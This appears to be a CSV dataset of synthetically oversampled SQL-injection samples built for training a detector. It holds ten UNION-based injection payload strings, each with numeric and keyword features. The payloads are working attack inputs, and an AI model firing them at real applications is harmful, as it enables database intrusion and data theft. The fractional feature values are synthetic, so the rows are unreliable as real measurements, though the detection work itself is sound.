id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000001,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000108,0.9800924658456504,81.40637510918963,23.296812445405187,3.8123192149231215,23.219125327568864,33.18724978162076,15.406375109189621,9.593624890810379,0.2848794053553211,0.4079802558839686,0.18914950567172487,0.11799083308898543,0.0,0.29681244540518903,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.296812445405189,4.0,0.0,0.29681244540518903,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000002,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000092,1.1112854530819456,65.22261853947873,17.0,3.2871156838318174,37.733571123687234,1.0,15.244523707895745,11.244523707895745,0.5781402415694636,0.01561411316466882,0.23435104896227138,0.17189459630359616,0.0,1.0,2.0,0.0,0.0,0.0,0.0,2.311130926973936,1.0,0.0,4.9333927809218086,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000003,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000078,0.4991767616781151,80.8777422358795,19.489031056482034,3.4614233755002908,57.53290683055389,1.9780621129640679,11.366773292361525,10.0,0.7111695465058604,0.024590322363304024,0.14059467161830388,0.12364545951253164,1.0,0.0,0.0,0.0,0.0,0.12225776412050865,0.0,1.0,0.0,0.0,6.8777422358794915,0.12225776412050848,1.0,0.0,0.0,1.0,0.0,0.1222577641205087,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.12225776412050865,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1222577641205085
SMOTE_000004,attack,union,"-3116""   )    )     )   union all select 4600,4600,4600,4600--",nearest_attack_euclidean,R000117,0.6555885075342542,63.57197859569695,20.0,3.683704222462458,14.000000000000002,22.51516575311512,16.74241712344244,10.31439571913939,0.22050849775162318,0.35255192700510307,0.2647410320006948,0.16219854324257887,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.68560428086061,0.0,0.0,3.6287914382787796,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000005,attack,union,"-4589""  )   union all select 1441,1441,1441,1441,1441,1441,1441,1441,1441,1441--",nearest_attack_euclidean,R000065,0.22975654056203243,79.21238022522695,20.0,3.2946811774671763,14.000000000000002,43.030621815663935,8.363516819126023,13.818241590436989,0.17705721582963108,0.5419972043550615,0.1066011760687064,0.17434440374660107,0.0,1.0,3.0,0.0,0.0,0.0,0.0,1.0605861365210039,0.0,0.0,8.757655453915984,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000006,attack,union,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",nearest_attack_euclidean,R000038,1.151832804425073,67.70692321497168,21.32326919625708,3.721018174591057,39.0,9.0,12.706923214971686,7.0,0.5764615372611157,0.13302958552179595,0.187041421811247,0.10346745540584129,0.3232691962570786,0.0,0.0,0.0,0.0,1.0,0.0,0.6767308037429214,0.0,0.0,4.0,1.0,0.3232691962570786,0.0,0.0,1.0,0.0,1.0,0.6767308037429214,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000007,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000050,0.6255383394841993,57.68124998778402,21.210156248473,3.7214575706488553,14.000000000000002,22.52187498167603,12.739062509161984,8.420312496946005,0.24343261723521867,0.3871651783532861,0.22373046894087467,0.14567173547062057,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.7898437515269974,0.0,0.0,3.6304687454190083,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000008,attack,union,"1""  )   as boeh where 2571  =  2571 union all select null#",nearest_attack_euclidean,R000100,1.0653768996434492,61.83917769683415,25.19381582676237,4.025613849062147,27.903092086618813,13.11340467517945,16.0,4.82268093503589,0.4581042116416908,0.2040289444178402,0.26115257587419866,0.07671426806627035,0.0,1.0,0.27422697834529686,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.5484539566905928,1.2742269783452964,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000009,attack,union," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",nearest_attack_euclidean,R000011,4.0425617436406505,76.55036556932038,25.899268861359246,3.865039827204118,42.20146227728151,1.9999999999999982,23.449634430679623,8.899268861359248,0.5511443113979116,0.026127694610621865,0.30638473053109405,0.11634326346037237,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.44963443067962394,1.0000000000000004,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000010,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000104,0.4558960822413241,67.14406792042472,19.943220376127414,3.6064590756358883,14.000000000000002,38.51525433633977,4.0,10.628813584084943,0.20945588030279855,0.5725907585283903,0.059844537229371025,0.15810882393944029,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.628813584084943,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
